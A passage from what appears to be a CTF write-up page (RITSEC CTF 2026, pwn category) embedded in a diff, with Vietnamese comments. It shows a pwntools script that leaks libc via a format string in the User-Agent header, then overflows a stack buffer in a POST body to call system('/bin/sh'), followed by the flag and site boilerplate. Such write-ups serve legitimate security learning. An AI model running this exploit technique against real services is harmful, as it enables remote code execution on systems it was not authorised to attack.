+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_io</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(host, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- STAGE 1: LEAK LIBC ---</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Bắt đầu Stage 1: Leak địa chỉ Libc...&#34;</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> get_io()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sử dụng Format String thông qua User-Agent để leak atoll (tham số thứ 1)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Theo disassembly: snprintf(&amp;s, 0x100, &amp;format, atoll, __return_addr, ...)</span>
+</span></span><span style="display:flex;"><span>leak_payload <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;GET /msg/0 HTTP/1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Host: &#34;</span> <span style="color:#f92672">+</span> host<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X-Debug: 1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;User-Agent: %p|%p</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># %p đầu tiên sẽ là địa chỉ của hàm atoll</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(leak_payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X-Debug-Info: &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lấy địa chỉ leak và tính toán Libc Base</span>
+</span></span><span style="display:flex;"><span>leaks <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;|&#34;</span>)
+</span></span><span style="display:flex;"><span>atoll_leak <span style="color:#f92672">=</span> int(leaks[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> atoll_leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;atoll&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Atoll leak: </span><span style="color:#e6db74">{</span>hex(atoll_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc base:  </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- STAGE 2: EXPLOIT OVERFLOW ---</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Bắt đầu Stage 2: Ghi đè stack và gọi system(&#39;/bin/sh&#39;)...&#34;</span>)
+</span></span><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> get_io()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tìm địa chỉ system và chuỗi &#34;/bin/sh&#34; trong libc đã leak</span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload overflow:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Padding 0x210 bytes để chạm đến rsp+0x230 (nơi lưu hàm sẽ được call)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ghi đè [rsp+0x230] bằng system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ghi đè [rsp+0x238] bằng địa chỉ &#34;/bin/sh&#34; (để nạp vào RDI)</span>
+</span></span><span style="display:flex;"><span>overflow_data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x210</span>
+</span></span><span style="display:flex;"><span>overflow_data <span style="color:#f92672">+=</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>overflow_data <span style="color:#f92672">+=</span> p64(binsh_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Gửi POST request với Content-Length đủ lớn để trigger memcpy overflow</span>
+</span></span><span style="display:flex;"><span>post_payload <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;POST /msg/0 HTTP/1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Host: &#34;</span> <span style="color:#f92672">+</span> host<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Content-Length: &#34;</span> <span style="color:#f92672">+</span> str(len(overflow_data))<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> overflow_data
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shell<span style="color:#f92672">.</span>send(post_payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Đã gửi payload. Đang chuyển sang chế độ tương tác...&#34;</span>)
+</span></span><span style="display:flex;"><span>shell<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>FLAG: RS{CFI_b1ind_sp0t_g0t_us3d_4g41n5t_b04rd_53cur1ty}</code></p>
+
+        </section>
+            
+    <footer>
+    <nav id="keywords" aria-label="Tags">
+        <span>Tags:&nbsp;</span>
+        
+        <!-- terms.html -->
+            <ul class="delimiter" role="presentation">
+                    <li><a href="../../../tags/ctf/" >CTF</a></li>
+                    <li><a href="../../../tags/pwn/" >PWN</a></li>
+                    <li><a href="../../../tags/risec-ctf/" >Risec CTF</a></li>
+            </ul>
+    </nav>
+    </footer>
+    </article>
+        <div id="exclude" role="presentation">
+            <!-- excluded last block frome some RSS reader and browser reader mode -->
+            
+    <div class="pagewidth">
+        <hr />
+        <div id="contentinfo" role="contentinfo" data-pagefind-ignore="all">
+                    <!-- related.html -->
+                    <!-- colophon.html -->
+    <div id="colophon" style="display: none;" aria-live="polite">
+        <strong class="section-title">Colophon</strong>
+        <div>
+            <div id="qr" role="img" aria-label="QR code"></div>
+            <div>
+                <div class="has-aria-label-top" aria-label="WRITE UP RITSEC CTF 2026"><span>http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/</span></div>
+                <div><span>This page is built on: </span><time datetime="2026-04-18T13:50:15&#43;07:00">2026-04-18 13:50</time></div>
+                <div><span>This page is accessed on: </span><time id="time-stamp"></time></div><div><span>Powered by </span><a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <a href="https://github.com/gohugoio/hugo/releases/tag/v0.160.1" aria-label="Hugo 0.160.1" target="_blank" rel="noopener">v0.160.1</a> & <a href="https://github.com/foxihd/hugo-brewm" target="_blank" rel="noopener">hugo-brewm</a>.</div>
+            </div>
+        </div>
+    </div>
+                    <!-- history.html -->
+        <div id="has-timeline" >
+            <strong class="section-title">Redaction History</strong>
+            <ol aria-label="Redaction History">
+                <li>
+                    <time datetime="2026-04-06T00:00:00&#43;00:00">April 6, 2026</time>
+                    <span>(Published)</span>
+                </li>
+                <li>
+                    <time datetime="2026-04-17T00:00:00&#43;00:00">April 17, 2026</time>
+                    <span>(Modified)</span>
+                </li>
+            </ol>
+            <p>Some information might changes over time, we keep redaction up to date.</p>
+        </div>
+                
+    <div id="contribute" tabindex="0">
+        
+        <strong class="section-title">Enjoy this article?</strong>
+        <br>
+        <span>
+            Awesome!
+            You can also support us by making the following contributions:
+        </span>
+        <!-- menu.html -->
+    <details id="has-contrib-menu" class="presentation" open>
+        <summary  class="hide"  aria-label="Contribute">
+            <span>Contribute</span>
+        </summary>
+            
+            <nav id="contrib-menu" aria-label="Contribute">
+                <ul class="l1   has-childfree " role="presentation" tabindex="-1" >
+                    
+    
+        <li role="presentation" >
+    <a   href=https://github.com/sponsors/niddala-sec/
+            target="_blank"
+            rel="external noopener noreferrer nofollow"
+
+        >
+        
+            <i class="icon sri">githubsponsors</i>
+            <span>
+                Become Github Sponsors</span>
+    </a>
+        </li>
+                </ul>
+            </nav>
+    </details>
+    </div>
+                <!-- nav.html -->
+<details class="presentation" aria-expanded="true" id="has-share" open>
+    <summary id="share" tabindex="-1">
+        <span>Share</span>
+    </summary>
+        <nav aria-labelledby="share">
+            <ul role="presentation" class="share srm">
+                    <!-- share.html -->
+    <li id="has-mastodon">
+        <!-- mastodon.html -->
+    <form class="form" id="mastodon" action="//sharetomastodon.github.io/" target="_blank" rel="noopener noreferrer">
+        <input id="mastodonTitle" type="hidden" name="title" value="WRITE UP RITSEC CTF 2026">
+        <input id="mastodonPermalink" type="hidden" name="url" value="http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/">
+        <input id="mastodonText" type="hidden" name="text" value="WRITE UP RITSEC CTF 2026 http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" disabled>
+        <input id="mastodonInstance" type="url" class="ldots form__input" placeholder="Enter Mastodon instance (https://www.example.com)" aria-label="Mastodon instance URL">
+        <button class="form__button" type="submit" aria-label="Share on Mastodon">
+            <i class="icon mastodon sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Mastodon</span>
+        </button>
+    </form>
+    </li>
+    <li>
+        <a href="mailto:?subject=WRITE%20UP%20RITSEC%20CTF%202026&body=http%3a%2f%2flocalhost%3a1313%2fmy-writeups%2fpost%2frisec-ctf-2026%2fwrite-up-ritsec-ctf-2026-for-practice%2f" role="button" aria-label="Share on Email">
+            <i class="email sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Email</span>
+        </a>
+    </li>
+    <li>
+        <a href="whatsapp://send?text=WRITE%20UP%20RITSEC%20CTF%202026%20http%3a%2f%2flocalhost%3a1313%2fmy-writeups%2fpost%2frisec-ctf-2026%2fwrite-up-ritsec-ctf-2026-for-practice%2f" role="button" aria-label="Share on Whatsapp">
+            <i class="whatsapp sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Whatsapp</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://telegram.me/share/url?text=WRITE%20UP%20RITSEC%20CTF%202026&amp;url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Telegram in new tab">
+            <i class="telegram sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Telegram</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://bsky.app/intent/compose?text=WRITE%20UP%20RITSEC%20CTF%202026&amp;url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Bluesky in new tab">
+            <i class="bluesky sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Bluesky</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://facebook.com/sharer/sharer.php?u=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Facebook in new tab">
+            <i class="facebook sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Facebook</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://news.ycombinator.com/submitlink?u=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/&amp;t=WRITE%20UP%20RITSEC%20CTF%202026" role="button"
+            aria-label="Share on Hackernews in new tab">
+            <i class="hackernews sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Hackernews</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/&amp;title=WRITE%20UP%20RITSEC%20CTF%202026&amp;summary=WRITE%20UP%20RITSEC%20CTF%202026&amp;source=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Linkedin in new tab">
+            <i class="linkedin sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Linkedin</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://pinterest.com/pin/create/button/?url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/&amp;media=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/&amp;description=WRITE%20UP%20RITSEC%20CTF%202026" role="button"
+            aria-label="Share on Pinterest in new tab">
+            <i class="pinterest sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Pinterest</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://reddit.com/submit/?url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/&amp;resubmit=true&amp;title=WRITE%20UP%20RITSEC%20CTF%202026" role="button"
+            aria-label="Share on Reddit in new tab">
+            <i class="reddit sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Reddit</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=WRITE%20UP%20RITSEC%20CTF%202026&amp;caption=WRITE%20UP%20RITSEC%20CTF%202026&amp;content=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/&amp;canonicalUrl=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Tumblr in new tab">
+            <i class="tumblr sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Tumblr</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://threads.net/intent/post?text=WRITE%20UP%20RITSEC%20CTF%202026&amp;url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Threads in new tab">
+            <i class="threads sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Threads</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://twitter.com/intent/tweet/?text=WRITE%20UP%20RITSEC%20CTF%202026&amp;url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" role="button"
+            aria-label="Share on Twitter in new tab">
+            <i class="twitter sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Twitter</span>
+        </a>
+    </li>
+    <li>
+        <a rel="noopener noreferrer" target="_blank" href="https://www.xing.com/app/user?op=share;url=http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/;title=WRITE%20UP%20RITSEC%20CTF%202026" role="button"
+            aria-label="Share on Xing in new tab">
+            <i class="xing sri" aria-hidden="true"></i>
+            <span class="t srt" role="tooltip">Share on Xing</span>
+        </a>
+    </li>
+            </ul>
+        </nav>
+</details>
+        </div>
+        
+            
+    </div>
+        <!-- main/footer.html -->
+    <hr class="hide">
+    <footer id="main-footer"><div class="column column--multicols pagewidth" style="--multicols: 2"><div id="main-footer-primary">
+                        <p><strong>Impressum</strong></p>
+<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
+<br>
+<fieldset id=cookie-banner>
+<legend>Cookie Banner</legend>
+<div>
+<span>We do not collect cookie</span>
+<img id="no-cookie" alt="No Cookie for Cookie Monster" />
+</div>
+</fieldset>
+                    </div>
+                <div id="main-footer-secondary"  class="column" style="--col: 10rem">
+                        <div>
+                            <p><strong>Impressum</strong></p>
+<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
+<br>
+<fieldset id=cookie-banner>
+<legend>Cookie Banner</legend>
+<div>
+<span>We do not collect cookie</span>
+<img id="no-cookie" alt="No Cookie for Cookie Monster" />
+</div>
+</fieldset>
+                        </div>
+                        <div>
+                            <p><strong>Example Links</strong></p>
+<ul>
+<li><a href="#">Example Link 1</a></li>
+<li><a href="#">Example Link 2</a></li>
+<li><a href="#">Example Link 3</a></li>
+<li><a href="#">Example Link 4</a></li>
+</ul>
+
+                        </div>
+                        <div>
+                            <p><strong>More Links</strong></p>
+<ul>
+<li><a href="#">More Link 1</a></li>
+<li><a href="#">More Link 2</a></li>
+<li><a href="#">More Link 3</a></li>
+</ul>
+
+                        </div>
+                        <div>
+                            <p><strong>Example Links</strong></p>
+<ul>
+<li><a href="#">Example Link 1</a></li>
+<li><a href="#">Example Link 2</a></li>
+<li><a href="#">Example Link 3</a></li>
+<li><a href="#">Example Link 4</a></li>
+</ul>
+
+                        </div>
+                        <div>
+                            <p><strong>More Links</strong></p>
+<ul>
+<li><a href="#">More Link 1</a></li>
+<li><a href="#">More Link 2</a></li>
+<li><a href="#">More Link 3</a></li>
+</ul>
+
+                        </div>
+                </div>
+            </div>
+            <div id="unified-footer"><p id="license">Copyleft 2026 © niddalA</p>
+                    <!-- menu.html -->
+    <nav id="menu-footer" class="has-aria-label-top" aria-label="Let&#39;s keep in touch!">
+        <ul role="presentation">
+            <li><a href="https://www.facebook.com/dan.ho.182325" aria-label="Facebook">
+                    <i class="icon">Facebook</i>
+                    <span class="t" role="tooltip">Facebook</span>
+                </a>
+            </li>
+            <li><a href="https://x.com/niddalA" aria-label="X">
+                    <i class="icon">X</i>
+                    <span class="t" role="tooltip">X</span>
+                </a>
+            </li>
+            <li><a href="mailto:hotrungdan3007@gmail.com" aria-label="Email">
+                    <i class="icon">email</i>
+                    <span class="t" role="tooltip">Email</span>
+                </a>
+            </li>
+            <li><a href="../../../" aria-label="linkedin">
+                    <i class="icon">linkedin</i>
+                    <span class="t" role="tooltip">linkedin</span>
+                </a>
+            </li>
+            <li><a href="../../../" aria-label="karya karsa">
+                    <i class="icon">karyakarsa</i>
+                    <span class="t" role="tooltip">karya karsa</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+                        <p id="coffee-counter">Made with ❤️ and 95 Cups of coffee, if not more.</p>
+            </div>
+    </footer>
+        </div>
+    </main>
+    <!-- footer.html -->
+<footer id="body-footer" class="pagewidth">
+    <div id="background-footer" class="background hide" role="presentation" aria-hidden="true"></div>
+    <div id="focusMode"></div>
+    <!-- a11y.html --><details id="has-a11y" class="presentation js-details hide" name="on-deck" aria-haspopup="true" aria-labelledby="has-a11y-summary"
+    data-i18n-accessibility="Accessibility"
+    data-i18n-optimizeSR="Screen Reader Optimization"
+    data-i18n-optimizeSRdesc="Optimize display and resources for screen reader users who navigate with a pointer device."
+    data-i18n-colorSettings="Color Settings"
+    data-i18n-darkMode="Dark Mode"
+    data-i18n-light="Light"
+    data-i18n-dark="Dark"
+    data-i18n-contrast="Contrast"
+    data-i18n-lessContrast="Low"
+    data-i18n-moreContrast="High"
+    data-i18n-defaultContrast="Default"
+    data-i18n-colorPalette="Color Palette"
+    data-i18n-defaultColor="Default"
+    data-i18n-deuteranopia="Deuteranopia"
+    data-i18n-protanopia="Protanopia"
+    data-i18n-tritanopia="Tritanopia"
+    data-i18n-monochrome="Monochrome"
+    data-i18n-fontSize="Font Size"
+    data-i18n-baselineStretch="Baseline Stretch"
+    data-i18n-OpenDyslexic="Use OpenDyslexic Font"
+    data-i18n-menuControls="Accessibility Menu Controls"
+    data-i18n-save="Save"
+    data-i18n-reset="Reset"
+    data-i18n-close="Close"
+    data-i18n-bionRead="BionRead Mode"
+    data-i18n-focusMode="Focus Mode"
+    data-i18n-noLocalStorage="LocalStorage is not available in your browser. Settings won&#39;t be saved.">
+</details>
+
+
+    <div id="useBionRead" class="sri"></div>
+    <!-- [top] bypass block -->
+    <nav aria-label="Bypass">
+        <a id="to-top" class="srm" href="#top" title="To Content Top" accesskey="c" aria-keyshortcuts="c" aria-label="To Content Top">
+            <span class="t srt">To Content Top</span>
+            <kbd class="key" aria-hidden="true" data-key="c"></kbd>
+        </a>
+    </nav>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    
+    mediumZoom('img', {
+      margin: 24,
+      background: 'rgba(0,0,0,0.9)' 
+    })
+  });
+</script>
+    
+    <!-- [post] single.html -->
+    <div id="bionReadSnapshot" hidden></div>
+    <!-- [background] baseof.html -->
+    <div id="background-body" role="presentation" aria-hidden="true"></div>
+</body>
+</html>
